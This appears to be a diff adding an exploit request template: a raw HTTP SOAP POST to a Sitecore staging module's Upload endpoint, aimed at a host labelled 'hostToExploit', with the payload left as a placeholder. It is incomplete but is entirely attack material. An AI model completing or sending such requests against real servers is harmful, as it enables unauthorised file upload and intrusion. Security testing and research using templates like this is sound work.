@@ -1,0 +1,15 @@
+POST /sitecore%20modules/staging/service/api.asmx HTTP/1.1
+Host: hostToExploit
+Content-Type: application/soap+xml; charset=utf-8
+Content-Length: 599
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap12:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
+xmlns:soap12=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;
+  &lt;soap12:Body&gt;
+    &lt;Upload xmlns=&quot;http://www.example.com/modules/Staging/API/&quot;&gt;
+      [Soap-Stuff]
+    &lt;/Upload&gt;
+  &lt;/soap12:Body&gt;
+&lt;/soap12:Envelope&gt;
